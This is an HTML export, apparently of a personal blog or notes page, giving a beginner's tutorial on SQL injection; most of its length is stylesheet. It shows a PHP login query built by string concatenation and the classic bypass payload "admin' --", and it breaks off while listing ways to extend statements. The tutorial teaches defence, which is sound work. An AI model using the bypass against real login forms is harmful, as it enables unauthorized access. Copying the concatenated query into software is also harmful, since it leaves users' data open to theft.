@@ -1,0 +1,733 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>SQL injection</title><style>
+	/* cspell:disable-file */
+	/* webkit printing magic: print all background colors */
+	html {
+		-webkit-print-color-adjust: exact;
+	}
+	* {
+		box-sizing: border-box;
+		-webkit-print-color-adjust: exact;
+	}
+	
+	html,
+	body {
+		margin: 0;
+		padding: 0;
+	}
+	@media only screen {
+		body {
+			margin: 2em auto;
+			max-width: 900px;
+			color: rgb(55, 53, 47);
+		}
+	}
+	
+	body {
+		line-height: 1.5;
+		white-space: pre-wrap;
+	}
+	
+	a,
+	a.visited {
+		color: inherit;
+		text-decoration: underline;
+	}
+	
+	.pdf-relative-link-path {
+		font-size: 80%;
+		color: #444;
+	}
+	
+	h1,
+	h2,
+	h3 {
+		letter-spacing: -0.01em;
+		line-height: 1.2;
+		font-weight: 600;
+		margin-bottom: 0;
+	}
+	
+	.page-title {
+		font-size: 2.5rem;
+		font-weight: 700;
+		margin-top: 0;
+		margin-bottom: 0.75em;
+	}
+	
+	h1 {
+		font-size: 1.875rem;
+		margin-top: 1.875rem;
+	}
+	
+	h2 {
+		font-size: 1.5rem;
+		margin-top: 1.5rem;
+	}
+	
+	h3 {
+		font-size: 1.25rem;
+		margin-top: 1.25rem;
+	}
+	
+	.source {
+		border: 1px solid #ddd;
+		border-radius: 3px;
+		padding: 1.5em;
+		word-break: break-all;
+	}
+	
+	.callout {
+		border-radius: 3px;
+		padding: 1rem;
+	}
+	
+	figure {
+		margin: 1.25em 0;
+		page-break-inside: avoid;
+	}
+	
+	figcaption {
+		opacity: 0.5;
+		font-size: 85%;
+		margin-top: 0.5em;
+	}
+	
+	mark {
+		background-color: transparent;
+	}
+	
+	.indented {
+		padding-left: 1.5em;
+	}
+	
+	hr {
+		background: transparent;
+		display: block;
+		width: 100%;
+		height: 1px;
+		visibility: visible;
+		border: none;
+		border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+	}
+	
+	img {
+		max-width: 100%;
+	}
+	
+	@media only print {
+		img {
+			max-height: 100vh;
+			object-fit: contain;
+		}
+	}
+	
+	@page {
+		margin: 1in;
+	}
+	
+	.collection-content {
+		font-size: 0.875rem;
+	}
+	
+	.column-list {
+		display: flex;
+		justify-content: space-between;
+	}
+	
+	.column {
+		padding: 0 1em;
+	}
+	
+	.column:first-child {
+		padding-left: 0;
+	}
+	
+	.column:last-child {
+		padding-right: 0;
+	}
+	
+	.table_of_contents-item {
+		display: block;
+		font-size: 0.875rem;
+		line-height: 1.3;
+		padding: 0.125rem;
+	}
+	
+	.table_of_contents-indent-1 {
+		margin-left: 1.5rem;
+	}
+	
+	.table_of_contents-indent-2 {
+		margin-left: 3rem;
+	}
+	
+	.table_of_contents-indent-3 {
+		margin-left: 4.5rem;
+	}
+	
+	.table_of_contents-link {
+		text-decoration: none;
+		opacity: 0.7;
+		border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+	}
+	
+	table,
+	th,
+	td {
+		border: 1px solid rgba(55, 53, 47, 0.09);
+		border-collapse: collapse;
+	}
+	
+	table {
+		border-left: none;
+		border-right: none;
+	}
+	
+	th,
+	td {
+		font-weight: normal;
+		padding: 0.25em 0.5em;
+		line-height: 1.5;
+		min-height: 1.5em;
+		text-align: left;
+	}
+	
+	th {
+		color: rgba(55, 53, 47, 0.6);
+	}
+	
+	ol,
+	ul {
+		margin: 0;
+		margin-block-start: 0.6em;
+		margin-block-end: 0.6em;
+	}
+	
+	li > ol:first-child,
+	li > ul:first-child {
+		margin-block-start: 0.6em;
+	}
+	
+	ul > li {
+		list-style: disc;
+	}
+	
+	ul.to-do-list {
+		padding-inline-start: 0;
+	}
+	
+	ul.to-do-list > li {
+		list-style: none;
+	}
+	
+	.to-do-children-checked {
+		text-decoration: line-through;
+		opacity: 0.375;
+	}
+	
+	ul.toggle > li {
+		list-style: none;
+	}
+	
+	ul {
+		padding-inline-start: 1.7em;
+	}
+	
+	ul > li {
+		padding-left: 0.1em;
+	}
+	
+	ol {
+		padding-inline-start: 1.6em;
+	}
+	
+	ol > li {
+		padding-left: 0.2em;
+	}
+	
+	.mono ol {
+		padding-inline-start: 2em;
+	}
+	
+	.mono ol > li {
+		text-indent: -0.4em;
+	}
+	
+	.toggle {
+		padding-inline-start: 0em;
+		list-style-type: none;
+	}
+	
+	/* Indent toggle children */
+	.toggle > li > details {
+		padding-left: 1.7em;
+	}
+	
+	.toggle > li > details > summary {
+		margin-left: -1.1em;
+	}
+	
+	.selected-value {
+		display: inline-block;
+		padding: 0 0.5em;
+		background: rgba(206, 205, 202, 0.5);
+		border-radius: 3px;
+		margin-right: 0.5em;
+		margin-top: 0.3em;
+		margin-bottom: 0.3em;
+		white-space: nowrap;
+	}
+	
+	.collection-title {
+		display: inline-block;
+		margin-right: 1em;
+	}
+	
+	.page-description {
+		margin-bottom: 2em;
+	}
+	
+	.simple-table {
+		margin-top: 1em;
+		font-size: 0.875rem;
+		empty-cells: show;
+	}
+	.simple-table td {
+		height: 29px;
+		min-width: 120px;
+	}
+	
+	.simple-table th {
+		height: 29px;
+		min-width: 120px;
+	}
+	
+	.simple-table-header-color {
+		background: rgb(247, 246, 243);
+		color: black;
+	}
+	.simple-table-header {
+		font-weight: 500;
+	}
+	
+	time {
+		opacity: 0.5;
+	}
+	
+	.icon {
+		display: inline-block;
+		max-width: 1.2em;
+		max-height: 1.2em;
+		text-decoration: none;
+		vertical-align: text-bottom;
+		margin-right: 0.5em;
+	}
+	
+	img.icon {
+		border-radius: 3px;
+	}
+	
+	.user-icon {
+		width: 1.5em;
+		height: 1.5em;
+		border-radius: 100%;
+		margin-right: 0.5rem;
+	}
+	
+	.user-icon-inner {
+		font-size: 0.8em;
+	}
+	
+	.text-icon {
+		border: 1px solid #000;
+		text-align: center;
+	}
+	
+	.page-cover-image {
+		display: block;
+		object-fit: cover;
+		width: 100%;
+		max-height: 30vh;
+	}
+	
+	.page-header-icon {
+		font-size: 3rem;
+		margin-bottom: 1rem;
+	}
+	
+	.page-header-icon-with-cover {
+		margin-top: -0.72em;
+		margin-left: 0.07em;
+	}
+	
+	.page-header-icon img {
+		border-radius: 3px;
+	}
+	
+	.link-to-page {
+		margin: 1em 0;
+		padding: 0;
+		border: none;
+		font-weight: 500;
+	}
+	
+	p > .user {
+		opacity: 0.5;
+	}
+	
+	td > .user,
+	td > time {
+		white-space: nowrap;
+	}
+	
+	input[type="checkbox"] {
+		transform: scale(1.5);
+		margin-right: 0.6em;
+		vertical-align: middle;
+	}
+	
+	p {
+		margin-top: 0.5em;
+		margin-bottom: 0.5em;
+	}
+	
+	.image {
+		border: none;
+		margin: 1.5em 0;
+		padding: 0;
+		border-radius: 0;
+		text-align: center;
+	}
+	
+	.code,
+	code {
+		background: rgba(135, 131, 120, 0.15);
+		border-radius: 3px;
+		padding: 0.2em 0.4em;
+		border-radius: 3px;
+		font-size: 85%;
+		tab-size: 2;
+	}
+	
+	code {
+		color: #eb5757;
+	}
+	
+	.code {
+		padding: 1.5em 1em;
+	}
+	
+	.code-wrap {
+		white-space: pre-wrap;
+		word-break: break-all;
+	}
+	
+	.code > code {
+		background: none;
+		padding: 0;
+		font-size: 100%;
+		color: inherit;
+	}
+	
+	blockquote {
+		font-size: 1.25em;
+		margin: 1em 0;
+		padding-left: 1em;
+		border-left: 3px solid rgb(55, 53, 47);
+	}
+	
+	.bookmark {
+		text-decoration: none;
+		max-height: 8em;
+		padding: 0;
+		display: flex;
+		width: 100%;
+		align-items: stretch;
+	}
+	
+	.bookmark-title {
+		font-size: 0.85em;
+		overflow: hidden;
+		text-overflow: ellipsis;
+		height: 1.75em;
+		white-space: nowrap;
+	}
+	
+	.bookmark-text {
+		display: flex;
+		flex-direction: column;
+	}
+	
+	.bookmark-info {
+		flex: 4 1 180px;
+		padding: 12px 14px 14px;
+		display: flex;
+		flex-direction: column;
+		justify-content: space-between;
+	}
+	
+	.bookmark-image {
+		width: 33%;
+		flex: 1 1 180px;
+		display: block;
+		position: relative;
+		object-fit: cover;
+		border-radius: 1px;
+	}
+	
+	.bookmark-description {
+		color: rgba(55, 53, 47, 0.6);
+		font-size: 0.75em;
+		overflow: hidden;
+		max-height: 4.5em;
+		word-break: break-word;
+	}
+	
+	.bookmark-href {
+		font-size: 0.75em;
+		margin-top: 0.25em;
+	}
+	
+	.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+	.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+	.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+	.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+	.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+	.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+	.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+	.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+	.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+	.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+	.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+	.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+	.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+	.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+	.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+	.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+	.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+	.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+	.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+	.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+	.highlight-default {
+		color: rgba(50, 48, 44, 1);
+	}
+	.highlight-gray {
+		color: rgba(115, 114, 110, 1);
+		fill: rgba(115, 114, 110, 1);
+	}
+	.highlight-brown {
+		color: rgba(159, 107, 83, 1);
+		fill: rgba(159, 107, 83, 1);
+	}
+	.highlight-orange {
+		color: rgba(217, 115, 13, 1);
+		fill: rgba(217, 115, 13, 1);
+	}
+	.highlight-yellow {
+		color: rgba(203, 145, 47, 1);
+		fill: rgba(203, 145, 47, 1);
+	}
+	.highlight-teal {
+		color: rgba(68, 131, 97, 1);
+		fill: rgba(68, 131, 97, 1);
+	}
+	.highlight-blue {
+		color: rgba(51, 126, 169, 1);
+		fill: rgba(51, 126, 169, 1);
+	}
+	.highlight-purple {
+		color: rgba(144, 101, 176, 1);
+		fill: rgba(144, 101, 176, 1);
+	}
+	.highlight-pink {
+		color: rgba(193, 76, 138, 1);
+		fill: rgba(193, 76, 138, 1);
+	}
+	.highlight-red {
+		color: rgba(205, 60, 58, 1);
+		fill: rgba(205, 60, 58, 1);
+	}
+	.highlight-default_background {
+		color: rgba(50, 48, 44, 1);
+	}
+	.highlight-gray_background {
+		background: rgba(248, 248, 247, 1);
+	}
+	.highlight-brown_background {
+		background: rgba(244, 238, 238, 1);
+	}
+	.highlight-orange_background {
+		background: rgba(251, 236, 221, 1);
+	}
+	.highlight-yellow_background {
+		background: rgba(251, 243, 219, 1);
+	}
+	.highlight-teal_background {
+		background: rgba(237, 243, 236, 1);
+	}
+	.highlight-blue_background {
+		background: rgba(231, 243, 248, 1);
+	}
+	.highlight-purple_background {
+		background: rgba(248, 243, 252, 1);
+	}
+	.highlight-pink_background {
+		background: rgba(252, 241, 246, 1);
+	}
+	.highlight-red_background {
+		background: rgba(253, 235, 236, 1);
+	}
+	.block-color-default {
+		color: inherit;
+		fill: inherit;
+	}
+	.block-color-gray {
+		color: rgba(115, 114, 110, 1);
+		fill: rgba(115, 114, 110, 1);
+	}
+	.block-color-brown {
+		color: rgba(159, 107, 83, 1);
+		fill: rgba(159, 107, 83, 1);
+	}
+	.block-color-orange {
+		color: rgba(217, 115, 13, 1);
+		fill: rgba(217, 115, 13, 1);
+	}
+	.block-color-yellow {
+		color: rgba(203, 145, 47, 1);
+		fill: rgba(203, 145, 47, 1);
+	}
+	.block-color-teal {
+		color: rgba(68, 131, 97, 1);
+		fill: rgba(68, 131, 97, 1);
+	}
+	.block-color-blue {
+		color: rgba(51, 126, 169, 1);
+		fill: rgba(51, 126, 169, 1);
+	}
+	.block-color-purple {
+		color: rgba(144, 101, 176, 1);
+		fill: rgba(144, 101, 176, 1);
+	}
+	.block-color-pink {
+		color: rgba(193, 76, 138, 1);
+		fill: rgba(193, 76, 138, 1);
+	}
+	.block-color-red {
+		color: rgba(205, 60, 58, 1);
+		fill: rgba(205, 60, 58, 1);
+	}
+	.block-color-default_background {
+		color: inherit;
+		fill: inherit;
+	}
+	.block-color-gray_background {
+		background: rgba(248, 248, 247, 1);
+	}
+	.block-color-brown_background {
+		background: rgba(244, 238, 238, 1);
+	}
+	.block-color-orange_background {
+		background: rgba(251, 236, 221, 1);
+	}
+	.block-color-yellow_background {
+		background: rgba(251, 243, 219, 1);
+	}
+	.block-color-teal_background {
+		background: rgba(237, 243, 236, 1);
+	}
+	.block-color-blue_background {
+		background: rgba(231, 243, 248, 1);
+	}
+	.block-color-purple_background {
+		background: rgba(248, 243, 252, 1);
+	}
+	.block-color-pink_background {
+		background: rgba(252, 241, 246, 1);
+	}
+	.block-color-red_background {
+		background: rgba(253, 235, 236, 1);
+	}
+	.select-value-color-default { background-color: rgba(84, 72, 49, 0.08); }
+	.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+	.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+	.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+	.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+	.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+	.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+	.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+	.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+	.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+	
+	.checkbox {
+		display: inline-flex;
+		vertical-align: text-bottom;
+		width: 16;
+		height: 16;
+		background-size: 16px;
+		margin-left: 2px;
+		margin-right: 5px;
+	}
+	
+	.checkbox-on {
+		background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+	}
+	
+	.checkbox-off {
+		background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+	}
+		
+	</style></head><body><article id="2241e11f-d73c-8011-a258-ed82b8afae1a" class="page sans"><header><h1 class="page-title">SQL injection</h1><p class="page-description"></p></header><div class="page-body"><h1 id="2241e11f-d73c-80bc-9888-ffa3a7546856" class="">1. Abstract</h1><p id="2241e11f-d73c-8014-8447-f8ba94834381" class="">This post detail about vulnerabilities server side is SQL injection. In my post, i will explain about root case of it, how to work it, common type of vulnerability, payload for purpose exploit it and recommendations.</p><hr id="2241e11f-d73c-807d-a92c-d5511b99cdbd"/><h1 id="2241e11f-d73c-8039-9e29-fd893c928ab3" class="">2. Introduction</h1><p id="2241e11f-d73c-80e3-bf7f-db2144a60b6c" class="">SQL injection is vulnerability appear at query with database. Here, attacker can exploit sensitive information or create, delete database or table,… This vulnerability impact with confidence and integrity of data. This my scope in post research is explain about rootcase of  vulnerability, list common type of it, recommendations for vulnerability.</p><hr id="2261e11f-d73c-803d-b726-f2dca34ede72"/><h1 id="2261e11f-d73c-8096-9d40-da9694b5a8be" class="">3. Where appear vulnerability SQL injection?</h1><p id="2261e11f-d73c-8052-b9ae-c1038a95809e" class="">SQL Injection vulnerabilities typically occur <strong>in locations where SQL queries are constructed using user input</strong>.<br/>At these points, if the input is <br/><strong>not properly validated or sanitized</strong>, an attacker can <strong>manipulate the query structure</strong>.</p><hr id="2241e11f-d73c-8048-b5c7-c765a10120f1"/><h2 id="2241e11f-d73c-8023-ba7b-f2a9ca6234e2" class="">4. How write Queries SQL in PHP</h2><p id="2241e11f-d73c-809b-97e3-e6f229983995" class="">Web applications often need to <strong>interact with a database</strong> to store or retrieve information. This interaction is handled through <strong>SQL queries</strong>. Some of the most commonly used SQL statement include:</p><ul id="2241e11f-d73c-8074-becc-ff7be15393e1" class="bulleted-list"><li style="list-style-type:disc"><code>SELECT</code> – retrieves data from a database</li></ul><ul id="2241e11f-d73c-8013-aa60-cc2b0fc7902d" class="bulleted-list"><li style="list-style-type:disc"><code>INSERT INTO</code> – adds new records</li></ul><ul id="2241e11f-d73c-80ad-836d-f51940457c89" class="bulleted-list"><li style="list-style-type:disc"><code>UPDATE</code> – modifies existing records</li></ul><ul id="2241e11f-d73c-8060-b653-d71cff1e024e" class="bulleted-list"><li style="list-style-type:disc"><code>DELETE</code> – removes records</li></ul><ul id="2241e11f-d73c-8020-80a0-c2bc604228c8" class="bulleted-list"><li style="list-style-type:disc"><code>CREATE TABLE</code> – creates a new table</li></ul><ul id="2241e11f-d73c-8061-ac34-c62ded38ea7f" class="bulleted-list"><li style="list-style-type:disc"><code>DROP TABLE</code> – deletes a table</li></ul><p id="2241e11f-d73c-8008-b407-e2207412dd12" class="">Here is a simple example of a <code>SELECT</code> query written in PHP:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-80a5-9ee2-cffe775c9fbc" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">$sql = &quot;SELECT * FROM users WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;&quot;;
+	$query = $database-&gt;query($sql);
+	$row = $query-&gt;fetch_assoc();</code></pre><p id="2241e11f-d73c-8061-b111-e83e42f8e6d7" class="">In this example:</p><ul id="2241e11f-d73c-8060-926e-e900a8a21bc3" class="bulleted-list"><li style="list-style-type:disc">The query attempts to <strong>select all columns</strong> from the <code>users</code> table.</li></ul><ul id="2241e11f-d73c-8087-a922-c1d822439129" class="bulleted-list"><li style="list-style-type:disc">It uses a <code>WHERE</code> clause to match the <code>username</code> and <code>password</code> provided by the user.</li></ul><ul id="2241e11f-d73c-8072-b4ec-da6f7b4a6eb7" class="bulleted-list"><li style="list-style-type:disc">The input values (<code>$username</code> and <code>$password</code>) are directly embedded into the query string — which is a potential security risk.</li></ul><ul id="2241e11f-d73c-807a-9b99-c027e94797e0" class="bulleted-list"><li style="list-style-type:disc">The query is executed by the database, and the result (typically one matching row) is returned to the backend application.</li></ul><p id="2241e11f-d73c-80f8-8474-f56fa24b07e0" class="">If the provided username and password match a record in the database, the user is considered authenticated.</p><p id="2241e11f-d73c-8088-a83f-e439c17d188d" class="">⚠️ <strong>However, directly inserting user input into SQL queries (as shown above) is dangerous. Malicious input can alter the intended logic of the query, leading to vulnerabilities such as SQL Injection.</strong></p><hr id="2241e11f-d73c-80a7-89cf-d927387652e0"/><h1 id="2241e11f-d73c-80e3-b9ca-ea43c2c803a9" class="">5. How to SQLi work</h1><p id="2241e11f-d73c-8076-b466-de11f630fe80" class="">SQL Injection works by <strong>injecting malicious input</strong> into a SQL query in such a way that the logic of the original query is altered. This happens when user input is directly concatenated into the query string without proper validation or sanitization.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-80c5-a33d-d1847bb27e04" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">SELECT * FROM users WHERE username = &#x27;admin&#x27;&#x27; AND password = &#x27;$password&#x27;
+	</code></pre><p id="2241e11f-d73c-804d-ad54-dd0bdbc58788" class="">Suppose an attacker enters the following input:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-80e4-853e-e73a49ac66d9" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">$username = admin&#x27; --
+	$password = anything
+	</code></pre><p id="2241e11f-d73c-80c1-b4eb-c81a69b34a71" class="">The resulting SQL query becomes:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-805b-9f02-e35f8e6a278e" class="code"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">SELECT * FROM users WHERE username = &#x27;admin&#x27; -- &#x27; AND password = &#x27;anything&#x27;
+	</code></pre><p id="2241e11f-d73c-80dd-b335-c42cff8712d7" class="">In SQL, <code>--</code> begins a comment, so everything after it is ignored. Therefore, the query becomes:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-804a-bb28-f8552d817580" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">SELECT * FROM users WHERE username = &#x27;admin&#x27;
+	</code></pre><p id="2241e11f-d73c-804f-acd6-ec282a499c19" class="">This allows the attacker to log in as the user <strong>admin</strong> without providing a valid password.</p><h3 id="2241e11f-d73c-80e1-b3be-fb77f57da2c4" class="">Why this happens?</h3><p id="2241e11f-d73c-8079-84e0-f3f9a8c2af5f" class="">In this case, the attacker <strong>closes the string prematurely</strong> with <code>&#x27;</code>, and injects SQL syntax to bypass the intended logic. The original query expected a condition like:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2241e11f-d73c-806c-b3e6-cdc62afe4b35" class="code"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">username = &#x27;something&#x27; AND password = &#x27;something&#x27;
+	</code></pre><p id="2241e11f-d73c-80bd-8dfb-d95abefb3686" class="">But the attacker manipulates it so the <code>AND password = ...</code> part is removed.</p><p id="2241e11f-d73c-807c-a925-e1b05a795af5" class="">SQL Injection allows attackers to:</p><ul id="2241e11f-d73c-80fc-a466-dd1eaacb472a" class="bulleted-list"><li style="list-style-type:disc">Bypass authentication</li></ul><ul id="2241e11f-d73c-8067-9a59-fb69fb9ae167" class="bulleted-list"><li style="list-style-type:disc">Access or modify unauthorized data</li></ul><ul id="2241e11f-d73c-800d-aecf-cd3c06489642" class="bulleted-list"><li style="list-style-type:disc">Execute administrative operations (like <code>DROP</code>, <code>UPDATE</code>, <code>INSERT</code>)</li></ul><ul id="2241e11f-d73c-8075-963f-c94df4a0c754" class="bulleted-list"><li style="list-style-type:disc">Exfiltrate data (in blind/time-based injections)</li></ul><hr id="2241e11f-d73c-804c-bae9-e496095f739c"/><h1 id="2241e11f-d73c-806b-8473-dfd3a084d386" class="">6. How to extend statement</h1><p id="2241e11f-d73c-80fd-bf92-c7808902b020" class="">In SQL have many method extend command as:</p><ul id="2241e11f-d73c-80f4-a126-d515af44623b" class="bulleted-list"><li 